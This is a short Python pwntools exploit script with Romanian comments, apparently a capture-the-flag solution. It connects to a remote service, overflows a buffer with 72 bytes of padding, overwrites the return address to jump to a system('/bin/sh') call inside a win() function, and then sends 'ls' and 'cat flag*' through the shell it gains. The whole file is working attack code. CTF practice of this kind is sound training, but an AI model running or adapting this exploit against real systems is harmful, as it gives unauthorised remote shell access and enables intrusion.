#!/usr/bin/env python3
from pwn import *

# Conectare la server
p = remote('dpl.razvan.sh', 30002)

# Așteaptă prompt-ul
p.recvuntil(b"Show me what you got\n")

# Offset calculat
offset = 72

# NU mai sarim la începutul win() (0x4011b9)
# Sarim direct unde se încarcă /bin/sh pentru system()
jump_addr = 0x4011d6

# Payload-ul magic
payload = b'A' * offset  # Padding până la adresa de retur
payload += p64(jump_addr)  # Noua adresă de retur

# Trimite exploit-ul
p.sendline(payload)

# Acum avem shell! Trimite comenzi:
p.sendline(b"ls")  # Listează fișierele
p.sendline(b"cat flag*")  # Caută și citește fișiere care încep cu "flag"

# Obține răspunsul
print(p.recvall(timeout=3).decode())

# Închide conexiunea
p.close()
